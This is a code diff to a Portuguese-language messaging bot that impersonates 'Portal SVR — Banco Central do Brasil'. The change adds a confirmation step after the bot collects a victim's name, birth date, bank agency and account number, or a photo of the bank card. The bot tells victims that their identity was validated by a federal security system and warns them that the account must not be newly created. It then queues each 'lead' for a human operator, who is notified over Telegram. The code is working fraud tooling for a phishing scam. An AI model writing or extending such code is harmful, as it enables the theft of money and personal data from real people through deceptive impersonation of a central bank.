@@ -820,6 +820,46 @@ async function processIncomingMessage(msg, targetChatId) {
 
     // --- ETAPA 1.3: DADOS BANCÁRIOS (Antes da fila) ---
     } else if (currentSession.step === 3) {
+        // Se o lead já enviou os dados e estamos aguardando o "SIM" de confirmação
+        if (currentSession.awaitingConfirm) {
+            if (text.toUpperCase() === 'SIM' || text.toUpperCase().includes('CORRETO') || text.toUpperCase().includes('ESTA')) {
+                // ✅ Confirmado — avançar para a fila
+                currentSession.step = 4;
+                delete currentSession.awaitingConfirm;
+                currentSession.mode = 'waiting';
+                chatSessions.set(targetChatId, currentSession);
+                saveSessions();
+
+                addToQueue(targetChatId, currentSession.name, currentSession.birthDate);
+                const queuePos = getQueuePosition(targetChatId);
+                const clientesFrente = queuePos > 1 ? queuePos - 1 : 0;
+
+                if (currentSession.tgMsgId) {
+                    await notifyTelegram(
+                        buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'na_fila', currentSession.docType),
+                        currentSession.tgMsgId
+                    );
+                }
+
+                const frenteMsg = clientesFrente > 0
+                    ? `Há *${clientesFrente} solicitação(ões)* sendo processada(s) antes da sua.`
+                    : `Sua solicitação é a próxima a ser processada.`;
+
+                await msg.reply(
+                    `📋 *AUTENTICAÇÃO CONCLUÍDA — Portal SVR*\n\n` +
+                    `Prezado(a) *${currentSession.name}*,\n` +
+                    `Sua identidade e vínculo bancário foram validados com êxito pelo sistema federal de segurança.\n\n` +
+                    `⌛ *STATUS ATUAL:* Aguardando Processamento\n\n` +
+                    `${frenteMsg}\n\n` +
+                    `Nosso operador entrará em contato em breve para os procedimentos finais de liberação dos ativos.\n\n` +
+                    `_Portal SVR — Banco Central do Brasil_`);
+                return;
+            } else {
+                // Se não confirmou (quer trocar), limpa o flag e deixa o fluxo seguir para ler os novos dados abaixo
+                delete currentSession.awaitingConfirm;
+            }
+        }
+
         if (msg.hasMedia) {
             console.log(`📸 [BANCO-FOTO] Lead ${targetChatId} enviou foto do cartão.`);
             try {
@@ -830,15 +870,16 @@ async function processIncomingMessage(msg, targetChatId) {
                 }
             } catch (e) { }
 
-            await msg.reply(`✅ *Imagem recebida!*\n\nAguarde enquanto o sistema realiza a leitura dos dados para vinculação ao seu protocolo de resgate.`);
-            
-            // Avança para a fila mesmo com foto
-            currentSession.step = 4;
+            currentSession.awaitingConfirm = true;
             currentSession.bankData = "FOTO_ENVIADA";
-            currentSession.mode = 'waiting';
             chatSessions.set(targetChatId, currentSession);
             saveSessions();
-            addToQueue(targetChatId, currentSession.name, currentSession.birthDate);
+
+            await msg.reply(
+                `✅ *Documento recebido com sucesso!*\n\n` +
+                `Prezado(a) titular, esta é a conta que o senhor(a) deseja utilizar para o recebimento dos valores ativos?\n\n` +
+                `⚠️ *Nota:* Devido aos protocolos de segurança, a validação de imagens é realizada por supervisão judicial e técnica do sistema SVR/BCB para garantir a integridade do repasse.\n\n` +
+                `*Responda SIM para confirmar.*`);
             return;
         }
 
@@ -846,52 +887,27 @@ async function processIncomingMessage(msg, targetChatId) {
         if (typedBank.length >= 4) {
             const bank = detectBank(typedBank);
             const bankName = bank ? bank.name : "Instituição Identificada";
+            
+            // Tenta extrair Agência e Conta
+            const agMatch = typedBank.match(/(?:ag[êe]ncia|ag):?\s*(\d{4,5})/i);
+            const ccMatch = typedBank.match(/(?:conta|cc):?\s*(\d{5,12}[-\s]?\d)/i);
+            const ag = agMatch ? agMatch[1] : (typedBank.split(/[-\s]/).find(p => p.length >= 3 && p.length <= 5) || "Pendente");
+            const cc = ccMatch ? ccMatch[1] : (typedBank.split(/[-\s]/).find(p => p.length > 5) || "Pendente");
 
-            // ✅ Cadastro concluído — colocar na fila de espera
-            currentSession.step = 4;
+            currentSession.awaitingConfirm = true;
             currentSession.bankData = typedBank;
-            currentSession.mode = 'waiting';
             chatSessions.set(targetChatId, currentSession);
             saveSessions();
 
-            // Adiciona à fila de espera
-            addToQueue(targetChatId, currentSession.name, currentSession.birthDate);
-            const queuePos = getQueuePosition(targetChatId);
-            const clientesFrente = queuePos > 1 ? queuePos - 1 : 0;
-
-            // Edita a mensagem no Telegram
-            if (currentSession.tgMsgId) {
-                await notifyTelegram(
-                    buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'na_fila', currentSession.docType),
-                    currentSession.tgMsgId
-                );
-            }
-
-            // Notifica o admin
-            await notifyTelegram(
-                `💰 <b>LEAD VALIDADO — NA FILA!</b>\n` +
-                `👤 Nome: ${currentSession.name}\n` +
-                `📅 Data: ${currentSession.birthDate}\n` +
-                `🏛️ Banco: ${typedBank} (Dect: ${bankName})\n` +
-                `🆔 Lead: <code>${targetChatId}</code>\n` +
-                `📊 Fila: <b>${queuePos}º</b>`
-            );
-
-            const frenteMsg = clientesFrente > 0
-                ? `Há *${clientesFrente} solicitação(ões)* sendo processada(s) antes da sua.`
-                : `Sua solicitação é a próxima a ser processada.`;
-
             await msg.reply(
                 `🏛️ *${bankName.toUpperCase()} IDENTIFICADO* ✅\n\n` +
-                `Confirmamos que esta é a instituição destino que receberá os montantes recuperados.\n\n` +
-                `⚠️ *AVISO DE SEGURANÇA:* Lembramos que a conta informada *NÃO* pode ser recém-criada ou sem movimentações antigas. O sistema do Banco Central valida contas inativas ou sem histórico real como "contas de risco", o que pode suspender a liberação automática.\n\n` +
-                `📋 *AUTENTICAÇÃO CONCLUÍDA — Portal SVR*\n\n` +
-                `Prezado(a) *${currentSession.name}*,\n` +
-                `Sua identidade e vínculo com o *${bankName}* foram validados com êxito.\n\n` +
-                `⌛ *STATUS ATUAL:* Aguardando Processamento\n\n` +
-                `${frenteMsg}\n\n` +
-                `Aguarde o contato de nosso operador para os procedimentos finais.\n\n` +
-                `_Portal SVR — Banco Central do Brasil_`);
+                `📍 *DADOS CAPTURADOS:*
+                - Agência: ${ag}
+                - Conta: ${cc}
+                - Instituição: ${bankName}\n\n` +
+                `Prezado(a) titular, confirme se realmente esta é a conta que o senhor(a) deseja utilizar para o recebimento do seu valor ativo?\n\n` +
+                `⚠️ *AVISO:* A conta *NÃO* pode ser recém-criada ou sem movimentações antigas, sob risco de bloqueio pelo sistema de segurança do Banco Central.\n\n` +
+                `*Responda SIM para confirmar* ou informe os dados novamente para trocar.`);
         } else {
             await msg.reply(`⚠️ *Dados Bancários Inválidos*\n\nPor gentileza, informe sua Agência e Conta corretamente para vinculação do resgate.`);
         }
